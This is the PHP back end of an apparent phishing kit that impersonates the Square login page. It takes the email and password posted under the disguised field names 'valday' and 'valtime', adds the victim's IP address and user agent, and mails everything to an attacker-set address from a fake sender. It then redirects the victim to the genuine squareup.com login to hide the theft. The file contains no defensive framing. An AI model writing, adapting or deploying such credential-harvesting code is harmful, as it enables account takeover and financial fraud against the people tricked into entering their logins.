<?php
include '../config.php';
if($_POST["valday"] != "" and $_POST["valtime"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------- Square-D -----------------------\n";
$message .= "Email            : ".$_POST['valday']."\n";
$message .= "Password           : ".$_POST['valtime']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- D3R3K --------------|\n";


$subject = "[Square-D] login |$ip";
$headers = "From: FX3 <l1r4@jam-epic.ct>";
mail($to, $subject, $message, $headers);

$fox=rand();
$fox=md5($fox);
  header ("Location: https://squareup.com/login");
}else{
header ("Location: index.php");
}

?>